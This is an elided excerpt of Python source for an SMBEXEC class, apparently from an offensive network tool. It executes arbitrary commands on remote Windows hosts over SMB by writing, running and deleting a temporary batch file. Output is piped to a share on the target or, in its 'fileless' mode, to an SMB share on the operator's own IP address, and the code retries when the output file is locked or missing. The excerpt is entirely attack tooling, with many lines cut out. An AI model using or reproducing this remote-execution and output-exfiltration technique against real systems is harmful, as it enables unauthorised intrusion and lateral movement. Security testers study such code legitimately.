...
class SMBEXEC:
    ...
    def execute_remote(self, data):
        ...
        command = (
            ...
            + "echo "
            + data
            + f" ^> \\\\%COMPUTERNAME%\\{self.__share}\\{self.__output} 2^>^&1 > %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\\{self.__batchFile}"
            if self.__retOutput
            else self.__shell + data
        )
        ...
        while True:
            try:
                ...
                if "STATUS_BAD_NETWORK_NAME" in str(e):
                    self.logger.fail(
                        f"SMBEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)"
                    )
                    break
                ...
                if "STATUS_SHARING_VIOLATION" in str(e):
                    self.logger.info(
                        f"File {self.__share}\\{self.__output} is still in use with {self.__tries - tries} tries left, retrying..."
                    )
                    tries += 1
                    sleep(1)
                elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                    self.logger.info(
                        f"File {self.__share}\\{self.__output} not found with {self.__tries - tries} tries left, deducting 10 tries and retrying..."
                    )
                    tries += 10
                    sleep(1)
                else:
    ...
    def execute_fileless(self, data):
        ...
        command = (
            self.__shell + data + f" ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}"
            if self.__retOutput
            else self.__shell + data
        )
